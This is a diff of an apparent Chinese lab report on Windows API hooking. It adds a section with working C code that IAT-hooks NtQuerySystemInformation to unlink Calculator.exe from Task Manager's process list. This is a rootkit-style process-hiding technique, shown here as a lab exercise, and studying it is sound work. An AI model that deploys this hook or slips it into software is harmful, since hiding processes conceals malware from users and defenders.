@@ -4,6 +4,7 @@
 
 - [x] 使用记事本写文件时，`hahaha`变成`hehehe`
 - [x] `dir`遍历，越过显示指定文件
+- [x] 任务管理器无法遍历显示指定进程
 
 ## 实验过程
 
@@ -111,6 +112,88 @@
 
   <img src="img/display-none.jpg" alt="成功隐藏" width=600>
 
+### 隐藏进程
+
+- 要列出当前进程列表，调用地并不是类似之前显而易见的`Process32First`和`Process32Next`函数，而是位于`ntdll.dll`的`NtQuerySystemInformation`函数
+- 编写`Fake_NtQuerySystemInformation`函数
+    ```c
+    // 需要添加的头文件
+    #include <winternl.h>
+
+    // winternl.h 中没有，需要手动添加的数据类型定义
+    #define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
+    typedef struct _MY_SYSTEM_PROCESS_INFORMATION
+    {
+        ULONG                   NextEntryOffset;
+        ULONG                   NumberOfThreads;
+        LARGE_INTEGER           Reserved[3];
+        LARGE_INTEGER           CreateTime;
+        LARGE_INTEGER           UserTime;
+        LARGE_INTEGER           KernelTime;
+        UNICODE_STRING          ImageName;
+        ULONG                   BasePriority;
+        HANDLE                  ProcessId;
+        HANDLE                  InheritedFromProcessId;
+    } MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;
+
+    HANDLE g_hHook_NtQuerySystemInformation = NULL;
+    typedef NTSTATUS(__stdcall* LPFN_NtQuerySystemInformation)(
+        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+        OUT PVOID                   SystemInformation,
+        IN ULONG                    SystemInformationLength,
+        OUT PULONG                  ReturnLength
+        );
+
+    NTSTATUS WINAPI Fake_NtQuerySystemInformation(
+        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+        OUT PVOID                   SystemInformation,
+        IN ULONG                    SystemInformationLength,
+        OUT PULONG                  ReturnLength
+    )
+    {
+        LPFN_NtQuerySystemInformation fnOrigin = (LPFN_NtQuerySystemInformation)GetIATHookOrign(g_hHook_NtQuerySystemInformation);
+        NTSTATUS status = fnOrigin(SystemInformationClass,
+            SystemInformation,
+            SystemInformationLength,
+            ReturnLength);
+        if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
+        {
+            // Loop through the list of processes
+            PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
+            PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)
+                SystemInformation;
+            do
+            {
+                pCurrent = pNext;
+                pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
+                    NextEntryOffset);
+                if (!wcsncmp(pNext->ImageName.Buffer, L"Calculator.exe", pNext->ImageName.Length))
+                {
+                    if (0 == pNext->NextEntryOffset)
+                        pCurrent->NextEntryOffset = 0;
+                    else
+                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
+                    pNext = pCurrent;
+                }
+            } while (pCurrent->NextEntryOffset != 0);
+        }
+        return status;
+    }
+    ```
+- 修改`DLLMain`中调用`IATHook`函数的传入参数
+    ```c
+    IATHook(
+                GetModuleHandleW(NULL),
+                "ntdll.dll",
+                "NtQuerySystemInformation",
+                Fake_NtQuerySystemInformation,
+                &g_hHook_NtQuerySystemInformation
+            );
+    ```
+- 被钩取的任务管理器与「逍遥」的计算器进程：<br>
+![计算器进程成功隐藏](img/hidden-process-taskmgr.jpg)
+- 上述方法并不适用于`tasklist.exe`
+
 ## 实验总结
 
 - 以`dumpbin`中显示的导入模块名为准
@@ -124,3 +207,4 @@
 - [FindNextFileW function](https://docs.microsoft.com/zh-cn/windows/win32/api/fileapi/nf-fileapi-findnextfilew)
 - [Listing the Files in a Directory](https://docs.microsoft.com/zh-cn/windows/win32/fileio/listing-the-files-in-a-directory)
 - [wcscmp](http://www.cplusplus.com/reference/cwchar/wcscmp/)
+- [Windows API Hooking Tutorial (Example with DLL Injection)](https://www.apriorit.com/dev-blog/160-apihooks)
